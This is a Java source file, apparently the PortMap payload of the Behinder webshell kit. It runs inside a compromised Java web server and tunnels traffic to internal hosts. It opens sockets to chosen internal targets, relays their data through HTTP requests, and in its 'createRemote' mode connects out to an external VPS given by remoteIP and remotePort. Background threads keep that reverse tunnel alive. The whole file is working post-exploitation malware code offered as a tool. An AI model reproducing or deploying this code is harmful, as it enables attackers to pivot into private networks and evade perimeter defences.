package net.rebeyond.behinder.payload.java;

import org.objectweb.asm.Opcodes;
import sun.misc.BASE64Decoder;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

public class PortMap implements Runnable {
    public static String action;
    public static String extraData;
    public static String remoteIP;
    public static String remotePort;
    public static String socketHash;
    public static String targetIP;
    public static String targetPort;
    HttpSession httpSession;
    String localKey;
    String remoteKey;
    String type;
    private HttpServletRequest Request;
    private HttpServletResponse Response;
    private HttpSession Session;

    public PortMap(String localKey2, String remoteKey2, String type2, HttpSession session) {
        this.localKey = localKey2;
        this.remoteKey = remoteKey2;
        this.httpSession = session;
        this.type = type2;
    }

    public PortMap() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = (HttpServletResponse) page.getResponse();
        this.Request = (HttpServletRequest) page.getRequest();
        try {
            portMap(page);
            return true;
        } catch (Exception e) {
            return true;
        }
    }

    public void portMap(PageContext page) throws Exception {
        String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
        if (action.equals("createLocal")) {
            try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                this.Session.setAttribute(localSessionKey, socketChannel);
                this.Response.setStatus(HttpServletResponse.SC_OK);
            } catch (Exception e) {
                e.printStackTrace();
                try {
                    ServletOutputStream so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            }
        } else if (action.equals("read")) {
            SocketChannel socketChannel2 = (SocketChannel) this.Session.getAttribute(localSessionKey);
            try {
                ByteBuffer buf = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                socketChannel2.configureBlocking(false);
                ServletOutputStream so2 = this.Response.getOutputStream();
                for (int bytesRead = socketChannel2.read(buf); bytesRead > 0; bytesRead = socketChannel2.read(buf)) {
                    so2.write(buf.array(), 0, bytesRead);
                    so2.flush();
                    buf.clear();
                }
                so2.flush();
                so2.close();
            } catch (Exception e2) {
                e2.printStackTrace();
                this.Response.setStatus(HttpServletResponse.SC_OK);
                try {
                    ServletOutputStream so3 = this.Response.getOutputStream();
                    so3.write(new byte[]{55, 33, 73, 54});
                    so3.write(e2.getMessage().getBytes());
                    so3.flush();
                    so3.close();
                    socketChannel2.socket().close();
                } catch (IOException ioException2) {
                    ioException2.printStackTrace();
                }
            }
        } else if (action.equals("write")) {
            SocketChannel socketChannel3 = (SocketChannel) this.Session.getAttribute(localSessionKey);
            try {
                byte[] extraDataByte = new BASE64Decoder().decodeBuffer(extraData);
                ByteBuffer buf2 = ByteBuffer.allocate(extraDataByte.length);
                buf2.clear();
                buf2.put(extraDataByte);
                buf2.flip();
                while (buf2.hasRemaining()) {
                    socketChannel3.write(buf2);
                }
            } catch (Exception e3) {
                try {
                    ServletOutputStream so4 = this.Response.getOutputStream();
                    so4.write(new byte[]{55, 33, 73, 54});
                    so4.write(e3.getMessage().getBytes());
                    so4.flush();
                    so4.close();
                    socketChannel3.socket().close();
                } catch (IOException ioException3) {
                    ioException3.printStackTrace();
                }
            }
        } else if (action.equals("closeLocal")) {
            try {
                Enumeration attributeNames = this.Session.getAttributeNames();
                while (attributeNames.hasMoreElements()) {
                    String attrName = attributeNames.nextElement().toString();
                    if (attrName.startsWith("local_" + targetIP + "_" + targetPort)) {
                        ((SocketChannel) this.Session.getAttribute(attrName)).close();
                        this.Session.removeAttribute(attrName);
                    }
                }
            } catch (IOException e4) {
                e4.printStackTrace();
            }
        } else if (action.equals("createRemote")) {
            List<Thread> workList = new ArrayList<>();
            this.Session.setAttribute("remote_portmap_workers", workList);
            try {
                String target2 = targetIP;
                int port2 = Integer.parseInt(targetPort);
                String vps = remoteIP;
                int vpsPort = Integer.parseInt(remotePort);
                SocketChannel localSocketChannel = SocketChannel.open();
                localSocketChannel.connect(new InetSocketAddress(target2, port2));
                String localKey2 = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                this.Session.setAttribute(localKey2, localSocketChannel);
                SocketChannel remoteSocketChannel = SocketChannel.open();
                remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));
                String remoteKey2 = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                this.Session.setAttribute(remoteKey2, remoteSocketChannel);
                Thread reader = new Thread(new PortMap(localKey2, remoteKey2, "read", this.Session));
                Thread writer = new Thread(new PortMap(localKey2, remoteKey2, "write", this.Session));
                Thread keeper = new Thread(new PortMap(localKey2, remoteKey2, "keepAlive", this.Session));
                reader.start();
                writer.start();
                keeper.start();
                workList.add(reader);
                workList.add(writer);
                workList.add(keeper);
                this.Response.setStatus(HttpServletResponse.SC_OK);
            } catch (Exception e5) {
                e5.printStackTrace();
                try {
                    ServletOutputStream so5 = this.Response.getOutputStream();
                    so5.write(new byte[]{55, 33, 73, 54});
                    so5.write(e5.getMessage().getBytes());
                    so5.flush();
                    so5.close();
                } catch (IOException ioException4) {
                    ioException4.printStackTrace();
                }
            }
        } else if (action.equals("closeRemote")) {
            Enumeration attributeNames2 = this.Session.getAttributeNames();
            while (attributeNames2.hasMoreElements()) {
                String attrName2 = attributeNames2.nextElement().toString();
                if (attrName2.startsWith("remote_") && attrName2.endsWith(targetIP + "_" + targetPort)) {
                    try {
                        ((SocketChannel) this.Session.getAttribute(attrName2)).close();
                    } catch (Exception e6) {
                    }
                    this.Session.removeAttribute(attrName2);
                }
            }
            for (Thread worker : (List<Thread>) this.Session.getAttribute("remote_portmap_workers")) {
                worker.interrupt();
            }
        }
    }

    public void run() {
        if (this.type.equals("read")) {
            while (true) {
                try {
                    SocketChannel localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                    ByteBuffer buf = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    OutputStream so = ((SocketChannel) this.httpSession.getAttribute(this.remoteKey)).socket().getOutputStream();
                    for (int bytesRead = localSocketChannel.read(buf); bytesRead > 0; bytesRead = localSocketChannel.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                    }
                    so.flush();
                    so.close();
                } catch (IOException e) {
                    try {
                        Thread.sleep(5000);
                    } catch (Exception e2) {
                    }
                }
            }
        } else if (this.type.equals("write")) {
            while (true) {
                try {
                    SocketChannel remoteSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.remoteKey);
                    ByteBuffer buf2 = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    OutputStream so2 = ((SocketChannel) this.httpSession.getAttribute(this.localKey)).socket().getOutputStream();
                    for (int bytesRead2 = remoteSocketChannel.read(buf2); bytesRead2 > 0; bytesRead2 = remoteSocketChannel.read(buf2)) {
                        so2.write(buf2.array(), 0, bytesRead2);
                        so2.flush();
                        buf2.clear();
                    }
                    so2.flush();
                    so2.close();
                } catch (IOException e3) {
                    try {
                        Thread.sleep(5000);
                    } catch (Exception e4) {
                    }
                }
            }
        } else if (this.type.equals("keepAlive")) {
            String target = targetIP;
            int port = Integer.parseInt(targetPort);
            String vps = remoteIP;
            int vpsPort = Integer.parseInt(remotePort);
            while (true) {
                if (!((SocketChannel) this.httpSession.getAttribute(this.localKey)).isConnected()) {
                    try {
                        SocketChannel localSocketChannel2 = SocketChannel.open();
                        this.httpSession.setAttribute(this.localKey, localSocketChannel2);
                        localSocketChannel2.connect(new InetSocketAddress(target, port));
                        SocketChannel remoteSocketChannel2 = SocketChannel.open();
                        this.httpSession.setAttribute(this.remoteKey, remoteSocketChannel2);
                        remoteSocketChannel2.connect(new InetSocketAddress(vps, vpsPort));
                    } catch (IOException ioException) {
                        ioException.printStackTrace();
                    }
                }
                try {
                    Thread.sleep(5000);
                } catch (Exception e5) {
                    e5.printStackTrace();
                }
            }
        }
    }
}
